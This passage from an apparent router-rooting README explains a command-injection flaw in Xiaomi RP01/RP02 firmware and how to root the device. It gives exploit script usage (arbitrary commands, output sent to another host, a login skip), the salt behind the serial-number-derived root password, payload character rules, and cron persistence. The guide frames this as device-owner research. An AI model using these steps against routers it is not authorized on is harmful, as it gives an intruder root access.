python3 tools/calc_root_pwd.py 12345/A1B2C3D4E5F6
```

To verify the algorithm yourself (compares against the firmware's own `mkxqimage`
running under qemu):

```bash
python3 tools/calc_root_pwd.py --selftest
```

> **For recovering the root password of your own device only.** The SN derives the root
> password directly — never share your SN or the computed password.

#### 3.2 Exploit: enable SSH

```bash
python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --password YOUR_WEB_PASSWORD
```

It runs three commands by default (generate hostkey → start dropbear). A response of
`{"code":0}` means success. Verify with:

```bash
nc -vz 192.168.31.1 22      # should print succeeded
```

> **Not sure it applies to your unit? Do a read-only check first** (sends a ping only,
> changes nothing):
> ```bash
> sudo tcpdump -i any icmp &          # in another terminal
> python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --password YOUR_WEB_PASSWORD --probe
> ```
> An ICMP packet from `192.168.31.1` proves command execution.

Other options:

| Flag | Purpose |
|---|---|
| `--cmd 'id'` | Run an arbitrary command |
| `--cmd 'uname -a' --exfil 192.168.31.100:8001` | Send command output back to your computer |
| `--no-auth` | Skip login (will ask you to confirm device ownership first) |
| `tools/exploit_set_global_enable.py` | **The other chain** — full write-up in [README_SET_GLOBAL_ENABLE.md](README_SET_GLOBAL_ENABLE.md), including the 60-firmware census scope. Requires login, no `--no-auth` option |

```bash
# The other chain: RP01 works with both; if one fails, try the other
python3 tools/exploit_set_global_enable.py --ip 192.168.31.1 --password YOUR_WEB_PASSWORD
```

> The second chain's flags and troubleshooting (the trap table, why the first line can't end
> with `|`, why `upper()` destroys letter-based bracket negation) all live in
> [README_SET_GLOBAL_ENABLE.md](README_SET_GLOBAL_ENABLE.md) — not repeated here.

#### 3.3 Log in

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    root@192.168.31.1
```

**Those two `-o` flags are mandatory.** The router's dropbear is 2017.75 and only offers
a SHA-1 `ssh-rsa` host key, which OpenSSH 8.8+ (bundled with macOS since Monterey)
disables by default. Without them you get
`no matching host key type found` — which looks like a refusal but is really your client
refusing the algorithm.

Add this to `~/.ssh/config` for convenience:

```
Host miwifi
    HostName 192.168.31.1
    User root
    HostKeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    LogLevel QUIET
```

Then just `ssh miwifi`.

#### 3.4 Persistence (surviving reboots)

> ✅ **Community-verified**: on RP02 it was confirmed that "after a reboot, SSH comes
> back within a minute". That delay is exactly the cron job's one-minute interval.
> If it somehow doesn't work on your unit, just re-run 3.2 — the vulnerability remains,
> so you can never lock yourself out.

**Why this is needed:** `/etc` is a RAM filesystem. Only `nvram` and `/data` (ubifs)
persist. `/etc/crontabs` is bind-mounted to `/data/etc/crontabs`, so a crontab entry
survives reboots.

Paste this into the router shell:

```sh
mkdir -p /data/ssh /etc/dropbear
[ -s /data/ssh/host_key ] || cp /etc/dropbear/dropbear_rsa_host_key /data/ssh/host_key 2>/dev/null
[ -s /data/ssh/host_key ] || dropbearkey -t rsa -f /data/ssh/host_key
cp /data/ssh/host_key /etc/dropbear/dropbear_rsa_host_key
chmod 700 /etc/dropbear; chmod 600 /etc/dropbear/dropbear_rsa_host_key
cat > /data/ssh/boot.sh <<'BOOTEOF'
#!/bin/sh
mkdir -p /etc/dropbear
[ -s /etc/dropbear/dropbear_rsa_host_key ] || cp /data/ssh/host_key /etc/dropbear/dropbear_rsa_host_key
chmod 600 /etc/dropbear/dropbear_rsa_host_key
netstat -ltn 2>/dev/null | grep -q ':22 ' || /usr/sbin/dropbear -p 22
BOOTEOF
chmod 755 /data/ssh/boot.sh
mkdir -p /etc/crontabs
cat > /etc/crontabs/root <<'CRONEOF'
*/5 * * * * command -v sp_check.sh >/dev/null && sp_check.sh
*/2 * * * * command -v logrotate >/dev/null && logrotate /etc/logrotate.conf
*/15 * * * * /usr/sbin/ntpsetclock 60 log >/dev/null 2>&1
* * * * * /usr/sbin/startscene_crontab.lua `/bin/date "+%u %H:%M"`
*/3 * * * * /usr/sbin/mobile_accel.sh check >/dev/null 2>&1
0 */6 * * * command -v sec_cfg_bak.sh >/dev/null && sec_cfg_bak.sh
* * * * * run-parts -a 1min /etc/periodic
*/5 * * * * run-parts -a 5min /etc/periodic
*/10 * * * * run-parts -a 10min /etc/periodic
3 * * * * run-parts -a hourly /etc/periodic
6 1 * * * run-parts -a daily /etc/periodic
*/30 * * * * /usr/sbin/cpu_temperature_protect.sh >/dev/null 2>&1
* * * * * /data/ssh/boot.sh
CRONEOF
chmod 600 /etc/crontabs/root
killall crond 2>/dev/null; sleep 1
/etc/init.d/cron restart 2>/dev/null || /usr/sbin/crond -c /etc/crontabs -b
nvram set ssh_en=1; nvram set telnet_en=1; nvram set uart_en=1; nvram commit
/data/ssh/boot.sh; sleep 1; netstat -ltn | grep ':22 '
```

The last line should print `tcp 0 0 0.0.0.0:22 ... LISTEN`.

> **About that crontab:** it is the stock one **minus** `1 3,4,5 * * * /usr/sbin/otapredownload`
> — Xiaomi's OTA pre-download job, whose internal `ota_upgrade()` is what actually pulls
> new firmware. Removing it prevents silent overnight upgrades. Everything else is kept.

#### 3.5 Back up the flash (strongly recommended)

This is your only undo button. **`mtd16` (ART wireless calibration) and `mtd21` (bdata:
SN, MAC, device keys) cannot be restored from any official firmware** — lose them and a
brick is permanent.

On your computer (leave this terminal running):

```bash
python3 tools/recv_backup.py ~/rp01_backup 8001
```

On the router shell:

```sh
for m in 0 1 2 3 4 5 13 14 16 17 18 21; do dd if=/dev/mtdblock$m of=/tmp/m.bin bs=65536 2>/dev/null; base64 /tmp/m.bin > /tmp/m.b64; wget -q --post-file=/tmp/m.b64 -O /dev/null http://YOUR_PC_IP:8001/mtd$m.b64; rm -f /tmp/m.bin /tmp/m.b64; done
```

The receiver prints a `[OK]` / `[NG]` size check per partition. All 12 must be `[OK]`.

**Why base64 first?** See [trap 4](#trap-4-backups-arrive-only-a-few-dozen-bytes).

Afterwards, copy `~/rp01_backup` to cloud storage or an external drive.

---

### 4. How the Vulnerability Works

#### 4.1 Call chain

```
POST /cgi-bin/luci/;stok=<TOKEN>/api/xqsystem/set_macfilter_rules
     mac=<valid MAC>&name=<payload>&option=0
  │
  ├─ handler reads name: formvalue("name")        ← 2 args, no regex
  │     (the older set_mac_filter uses formvalue("name", nil, "?commonstr") ← regex)
  │
  ├─ XQSecureUtil.hackCheck would normally filter metacharacters,
  │     but "name" is on its whitelist → passed straight through
  │
  ├─ XQFirewall.setMacFilter(mac, name, "0", "")
  │
  └─ os.execute("/usr/sbin/macfilter add black <mac> rulename=<payload>")
        ↑ no escaping, runs as root
```

#### 4.2 Key code (from the unpacked Lua)

`XQFirewall.lua`:

```lua
L11 = "/usr/sbin/macfilter " .. L7 .. " " .. L8 .. " " .. A0
if A1 then
    L11 = L11 .. " rulename=" .. A1      -- A1 is `name`, unescaped
end
os.execute(L11)
```

`XQSecureUtil.lua`:

```lua
local whitelist = { name = 1, password = 1, ssid = 1, ... }
if whitelist[key] then return true end      -- whitelisted → pass through untouched
-- otherwise check against the forbidden class [ ` ; | $ & \n ]
```

#### 4.3 Payload rules (measured)

| Character | Usable? | Why |
|---|---|---|
| Newline | ✅ | Whitelisted; the handler doesn't split on it |
| Backtick `` ` `` | ✅ | Same |
| `$( )` | ✅ | Same |
| `\|` `&` | ✅ | Same |
| **Semicolon `;`** | ❌ | The handler splits `mac`/`name` on `;`; anything after it is dropped |

Also required:

- `option` must be `0` (=add). With `option=1` (delete) and an absent MAC it returns early.
- `mac` must match `^[0-9a-fA-F:;]+$` and must not already be in the filter table
  (the script generates a fresh random MAC each run).

#### 4.4 Where the root password comes from

`etc/init.d/system`:

```sh
set_user(){
    local inited=$(uci -q get xiaoqiang.common.INITTED)
    [ "$inited" != "YES" ] && {
        local init_pwd=`mkxqimage -I`              # ← password generated here
        [ -n "$init_pwd" ] && {
            (echo $init_pwd; sleep 1; echo $init_pwd) | passwd root
        }
    }
}
```

The stock config has no `INITTED` key, so this always runs on first boot. `mkxqimage`
reads `nvram get SN` and computes
`MD5(SN + "6d2df50a-250f-4a30-a5e6-d44fb0960aa0")`, taking the first 8 characters.

#### 4.5 The other chain: `set_global_enable`

This repo documents a **second, independent chain** —
`api/device_security/local_access/set_global_enable`. How the two differ:

| | This page (4.1) | The other chain (4.5) |
|---|---|---|
| Endpoint | `api/xqsystem/set_macfilter_rules` | `api/device_security/local_access/set_global_enable` |
| Param filtering | `XQParam` / hackCheck | `formvalue()` with no argument (whole table) |
| Injected param | `rulename` | `mac` |
| Downstream sink | `os.execute("/usr/sbin/macfilter add black …")` | `os.execute("milog.sh -m '{…}'")` |
| Login required | no (`--no-auth`) | **yes** (sysauth=admin) |
| Scope | RP01 / RP02, measured | 12 models out of a 60-image census |

**Full write-up and exploit script → [README_SET_GLOBAL_ENABLE.md](README_SET_GLOBAL_ENABLE.md)**

> RP01 works with both chains. If one fails, try the other.

---

### 5. Troubleshooting: Four Traps

#### Trap 1: telnetd won't start (port 23 refused)

Xiaomi **patched busybox's `telnetd`**. On startup it reads:

```
cat /proc/xiaoqiang/ft_mode
cat /usr/share/xiaoqiang/xiaoqiang_version | grep CHANNEL
bdata get telnet_en / nvram get telnet_en
```

On stable (`CHANNEL=release`) it refuses to start unless `telnet_en=1` or `ft_mode=1`.
The gate is **inside the busybox binary**, not in `/etc/init.d/telnet` — so editing the
init script does nothing.

**Fix: use dropbear instead** (it contains none of those checks).

#### Trap 2: `dropbear -p 22 -R` won't start

`/etc/dropbear/dropbear_rsa_host_key` ships as a **0-byte placeholder**, and `-R`
(auto-generate) will not overwrite an existing file — so dropbear starts with an empty key
and dies.

**Fix: delete it, then generate explicitly**

```sh
rm -f /etc/dropbear/dropbear_rsa_host_key
dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key
/usr/sbin/dropbear -p 22
```

#### Trap 3: SSH handshake fails

```
Unable to negotiate with 192.168.31.1 port 22: no matching host key type found. Their offer: ssh-rsa
```

dropbear 2017.75 only speaks SHA-1 `ssh-rsa`; OpenSSH 8.8+ disables it by default.

**Fix:** add `-o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa`.

#### Trap 4: Backups arrive only a few dozen bytes

busybox's `wget --post-file` **handles the file as a C string and truncates at the first
`0x00`**. Binary partitions get cut off at their first NUL byte.

The nasty part: partitions that happen to contain no NUL byte come through **completely**,
creating the illusion that the pipeline is fine and only some partitions are broken.
Catching it requires checking the size table.

**Fix: base64 first**

```sh
base64 /tmp/m.bin > /tmp/m.b64     # pure ASCII, no NUL
```

The size check is easy too: `512KB → 4×ceil(524288/3)=699,052` chars + `9,199` newlines
= `708,251` bytes. If that matches, the transfer was complete.

---

<a id="faq-en"></a>

### 6. FAQ

**Q: Will the router disappear from the Mi Home app?**

No. That happens when `CHANNEL` is changed from `release` to `debug`. This guide never
touches it — and on this model `/` is a read-only squashfs with no overlay on `/usr`, so
that file can't be modified anyway.

**Q: Does SSH survive a reboot?**

Yes. [3.4 persistence](#34-persistence-surviving-reboots) was community-verified on RP02:
dropbear comes back within about a minute (the cron interval). If it doesn't work on your
unit, re-run 3.2 — you can't lock yourself out.

**Q: Can I use the official SSH tool?**

No, it doesn't support newer models like RP01.

**Q: Can I downgrade to an older firmware?**

No. RP01 has only ever had 1.0.67.

**Q: Will a firmware update take root away?**

Possibly. Xiaomi has two upgrade paths, and turning off the WEB switch alone is not enough:

| Path | Mechanism | Status |
|---|---|---|
| WEB / Mi Home "auto upgrade" switch | sets `otapred.settings.auto` | disabled once you turn it off |
| **Stock crontab job** | `1 3,4,5 * * * /usr/sbin/otapredownload` | runs at 3/4/5 AM; its `ota_upgrade()` pulls new firmware |

To block both:

```sh
# 1. Confirm the switch is off (should print 0)
uci get otapred.settings.auto
# if not:
uci set otapred.settings.auto=0; uci commit otapred

# 2. Remove the OTA cron job (the crontab in 3.4 already omits it)
grep otapredownload /etc/crontabs/root || echo "already removed"

# 3. Optional: block the OTA server at DNS level
uci add_list dhcp.@dnsmasq[0].address='/bigota.miwifi.com/0.0.0.0'
uci commit dhcp && /etc/init.d/dnsmasq restart
```

Step 3 resolves `bigota.miwifi.com` (Xiaomi's OTA download host) to `0.0.0.0`, so no
firmware can be fetched even if the first two fail. **You'll need to undo it if you ever
want to upgrade deliberately.**

**Q: Can I share my SN or password?**

**No.** The SN derives your device's root password directly.

---

### 7. Appendix

#### Files

| File | Purpose |
|---|---|
| `tools/calc_root_pwd.py` | Derive the root password from the SN; includes a 14-case self-test |
| `tools/exploit_set_macfilter_rules.py` | The exploit for the `set_macfilter_rules` chain (single endpoint, self-written, no auto-probing) |
| `tools/exploit_set_global_enable.py` | The exploit for the other chain, `set_global_enable` (see [README_SET_GLOBAL_ENABLE.md](README_SET_GLOBAL_ENABLE.md)) |
| [`README_SET_GLOBAL_ENABLE.md`](README_SET_GLOBAL_ENABLE.md) | **Full doc for the second chain**: call chain, three measured traps, annotated payload, 60-firmware census, usage and troubleshooting |
| `tools/recv_backup.py` | Flash backup receiver; auto base64-decodes and size-checks |

#### On xmir-patcher's auto-probe

**Don't** use it to check whether your device is vulnerable. The public `connect6.py`
sends real probe parameters and, on success, **enables SSH, changes the root password and
starts services** — it is not a read-only scan. The script here is a single request
against a single endpoint; read the source yourself.

#### Partition table (RP01)

| Partition | Size | Contents | Priority |
|---|---|---|---|
| mtd0 / mtd1 | 1.5 MB | SBL1 ×2 | High |
| mtd2 | 1 MB | MIBIB partition table | High |
| mtd3 / mtd4 | 512 KB | BOOTCONFIG ×2 | Medium |
| mtd5 / mtd6 | 3.5 MB | QSEE ×2 | Medium |
| mtd14 / mtd15 | 1.5 MB | APPSBL (uboot) ×2 | High |
| **mtd16** | 2 MB | **ART wireless calibration** | **Highest** |
| mtd17 / mtd18 | 512 KB / 256 KB | TRAINING / LICENSE | Medium |
| mtd19 / mtd20 | 45 MB | rootfs A/B | Medium |
| **mtd21** | 512 KB | **bdata (SN / MAC / keys)** | **Highest** |
| mtd23 | 47 MB | overlay (UBI: cfg/user/plugin) | Medium |

#### Mount information

```
/dev/mtdblock29  on /      squashfs  ro     ← root is read-only; /usr cannot be modified
ubi23:cfg        on /data  ubifs     rw     ← this is what persists
```

#### Dependencies

**No third-party dependencies.** All three scripts use only the Python 3 standard library
(`hashlib`, `http.server`, `argparse`, `socketserver`, `base64`).

[xmir-patcher](https://github.com/openwrt-xiaomi/xmir-patcher) is deliberately *not* a
dependency:

1. That repo **declares no license** (GitHub shows "No license"), i.e. all rights reserved
   by default — copying or merging its code would carry license risk. **No line of its
   code is used here.**
2. This project exists precisely to provide a path that does *not* depend on it.
3. Single-file, zero-dependency code is easier to audit and more likely to survive.

#### Credits

Inspired by the following (referenced by link only — no code copied):

| Project | Relation |
|---|---|
| [openwrt-xiaomi/xmir-patcher](https://github.com/openwrt-xiaomi/xmir-patcher) | Foundational work in the Xiaomi router rooting scene; this project complements it on models/firmwares where its entry points fail |
| `unluac_miwifi` (fork by NyaMisty) | Decompiles Xiaomi's custom Lua bytecode; used to locate the call chain |
| [QEMU](https://www.qemu.org/) user-mode | Runs the firmware's own ARM binaries on x86, so every step could be tested instead of guessed |
| [OpenWrt](https://openwrt.org/) | Xiaomi's firmware is based on it |

---

### Disclaimer

For **research and management of devices you own**. Do not use it against devices you are
not authorized to test. Back up your flash before proceeding. You accept all risks; the
author is not liable for any damage, data loss, or voided warranty.

Notes that help characterize this repository:

- Contains no third-party firmware binaries; all firmware analysis can be reproduced
  by unpacking your own device
- The exploit requires the target's WEB admin password, and the only bypass carries an
  ownership confirmation guard
- No scanning, no lateral movement, no backdoor functionality — single-device only
- If a rights holder believes this repository infringes their rights, please open a
  GitHub issue and it will be addressed

**↑ [Back to language selector / 回到语言选择](#top)**
